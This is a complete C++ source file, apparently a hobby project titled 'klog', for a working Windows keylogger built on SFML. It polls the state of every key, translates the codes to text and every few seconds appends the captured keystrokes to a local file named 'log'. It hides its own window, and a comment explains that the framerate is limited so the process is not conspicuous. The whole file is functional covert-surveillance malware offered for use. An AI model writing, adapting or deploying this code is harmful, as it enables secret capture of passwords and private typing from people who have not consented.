#include <SFML/Graphics.hpp>
#include <Windows.h>
#include <iostream>
#include <vector>
#include <map>
#include <string>
#include <sstream>
#include <fstream>
using namespace std;
const map<sf::Keyboard::Key, string> keyToText = {
	{sf::Keyboard::A,"a"},
	{sf::Keyboard::B,"b"},
	{sf::Keyboard::C,"c"},
	{sf::Keyboard::D,"d"},
	{sf::Keyboard::E,"e"},
	{sf::Keyboard::F,"f"},
	{sf::Keyboard::G,"g"},
	{sf::Keyboard::H,"h"},
	{sf::Keyboard::I,"i"},
	{sf::Keyboard::J,"j"},
	{sf::Keyboard::K,"k"},
	{sf::Keyboard::L,"l"},
	{sf::Keyboard::M,"m"},
	{sf::Keyboard::N,"n"},
	{sf::Keyboard::O,"o"},
	{sf::Keyboard::P,"p"},
	{sf::Keyboard::Q,"q"},
	{sf::Keyboard::R,"r"},
	{sf::Keyboard::S,"s"},
	{sf::Keyboard::T,"t"},
	{sf::Keyboard::U,"u"},
	{sf::Keyboard::V,"v"},
	{sf::Keyboard::W,"w"},
	{sf::Keyboard::X,"x"},
	{sf::Keyboard::Y,"y"},
	{sf::Keyboard::Z,"z"},
	{sf::Keyboard::Num0,"0"},
	{sf::Keyboard::Num1,"1" },
	{sf::Keyboard::Num2,"2" },
	{sf::Keyboard::Num3,"3" },
	{sf::Keyboard::Num4,"4" },
	{sf::Keyboard::Num5,"5" },
	{sf::Keyboard::Num6,"6" },
	{sf::Keyboard::Num7,"7" },
	{sf::Keyboard::Num8,"8" },
	{sf::Keyboard::Num9,"9" },
	{sf::Keyboard::Escape,"[esc]"},
	{sf::Keyboard::LControl,"[ctrlL]" },
	{sf::Keyboard::LShift,"[shiftL]" },
	{sf::Keyboard::LAlt,"[altL]" },
	{sf::Keyboard::LSystem,"[sysL]" },
	{sf::Keyboard::RControl,"[ctrlR]" },
	{sf::Keyboard::RShift,"[shiftR]" },
	{sf::Keyboard::RAlt,"[altR]" },
	{sf::Keyboard::RSystem,"[sysR]" },
	{sf::Keyboard::Menu,"[menu]" },
	{sf::Keyboard::LBracket,"{" },
	{sf::Keyboard::RBracket,"}" },
	{sf::Keyboard::SemiColon,";" },
	{sf::Keyboard::Comma,"," },
	{sf::Keyboard::Period,"." },
	{sf::Keyboard::Quote,"'" },
	{sf::Keyboard::Slash,"/" },
	{sf::Keyboard::BackSlash,"\\" },
	{sf::Keyboard::Tilde,"`" },
	{sf::Keyboard::Equal,"=" },
	{sf::Keyboard::Dash,"-"},
	{sf::Keyboard::Space," " },
	{sf::Keyboard::Return,"[enter]" },
	{sf::Keyboard::BackSpace,"[bSpace]" },
	{sf::Keyboard::Tab,"[tab]" },
	{sf::Keyboard::PageUp,"[pgUp]" },
	{sf::Keyboard::PageDown,"[pgDn]" },
	{sf::Keyboard::End,"[end]" },
	{sf::Keyboard::Home,"[home]" },
	{sf::Keyboard::Insert,"[ins]" },
	{sf::Keyboard::Delete,"[del]" },
	{sf::Keyboard::Add,"[+]" },
	{sf::Keyboard::Subtract,"[-]" },
	{sf::Keyboard::Multiply,"[*]" },
	{sf::Keyboard::Divide,"[divide]"},
	{sf::Keyboard::Left,"[<-]" },
	{sf::Keyboard::Right,"[->]" },
	{sf::Keyboard::Up,"[^]" },
	{sf::Keyboard::Down,"[V]" },
	{sf::Keyboard::Numpad0,"[0]" },
	{sf::Keyboard::Numpad1,"[1]"},
	{sf::Keyboard::Numpad2,"[2]" },
	{sf::Keyboard::Numpad3,"[3]"},
	{sf::Keyboard::Numpad4,"[4]" },
	{sf::Keyboard::Numpad5,"[5]" },
	{sf::Keyboard::Numpad6,"[6]" },
	{sf::Keyboard::Numpad7,"[7]" },
	{sf::Keyboard::Numpad8,"[8]" },
	{sf::Keyboard::Numpad9,"[9]" },
	{sf::Keyboard::F1, "[F1]" },
	{sf::Keyboard::F2, "[F2]" },
	{sf::Keyboard::F3, "[F3]" },
	{sf::Keyboard::F4, "[F4]" },
	{sf::Keyboard::F5, "[F5]" },
	{sf::Keyboard::F6, "[F6]" },
	{sf::Keyboard::F7, "[F7]" },
	{sf::Keyboard::F8, "[F8]" },
	{sf::Keyboard::F9, "[F9]" },
	{sf::Keyboard::F10,"[F10]" },
	{sf::Keyboard::F11,"[F11]" },
	{sf::Keyboard::F12,"[F12]" },
	{sf::Keyboard::F13,"[F13]" },
	{sf::Keyboard::F14,"[F14]" },
	{sf::Keyboard::F15,"[F15]" },
	{sf::Keyboard::Pause,"[pause]" }
};
int main()
{
	string keyLogRAM;
	bool pressedKeys[sf::Keyboard::KeyCount];
	for (size_t k = 0; k < sf::Keyboard::KeyCount; k++)
	{
		pressedKeys[k] = false;
	}
//#ifdef _WIN32
//	HWND consoleWindow = GetConsoleWindow();
//	if (consoleWindow != NULL)
//	{
//		ShowWindow(consoleWindow, SW_MAXIMIZE);
//	}
//#endif
	sf::RenderWindow window{ sf::VideoMode(800, 600), "klog" };
	// framerate needs to be < infinite because we don't want the
	//	process to conspicuously drag threads
	window.setFramerateLimit(120);
	sf::Clock writeTimer;
	writeTimer.restart();
#ifdef _WIN32
	sf::WindowHandle handle = window.getSystemHandle();
	ShowWindow(handle, SW_HIDE);
#endif
	//sf::Event event;
	while (window.isOpen())
	{
		//while (window.pollEvent(event))
		//{
		//	switch (event.type)
		//	{
		//	case sf::Event::Closed:
		//		window.close();
		//		break;
		//	case sf::Event::KeyPressed:
		//		cout << event.key.code << "\n";
		//		break;
		//	}
		//}
		for (int k = 0; k < int{ sf::Keyboard::KeyCount }; k++)
		{
			const sf::Keyboard::Key key = static_cast<sf::Keyboard::Key>(k);
			if (sf::Keyboard::isKeyPressed(key))
			{
				if (!pressedKeys[k])
				{
					auto kIt = keyToText.find(key);
					if (kIt == keyToText.end())
					{
						stringstream ss;
						ss << "~" << k << "~";
#ifdef _DEBUG_
						cout << ss.str();
#endif
						keyLogRAM += ss.str();
					}
					else
					{
#ifdef _DEBUG_
						cout << kIt->second;
#endif
						keyLogRAM += kIt->second;
					}
					//keyLogRAM.push_back(key);
				}
				pressedKeys[k] = true;
				writeTimer.restart();
			}
			else
			{
				pressedKeys[k] = false;
			}
		}
		if (keyLogRAM.size() > 0 &&
			writeTimer.getElapsedTime().asSeconds() >= 3)
		{
			fstream fileLog{ "log", fstream::out | fstream::app };
			if (fileLog.is_open())
			{
				fileLog << keyLogRAM;
				fileLog.flush();
				fileLog.close();
				keyLogRAM = "";
				writeTimer.restart();
			}
		}
	}
	return EXIT_SUCCESS;
}
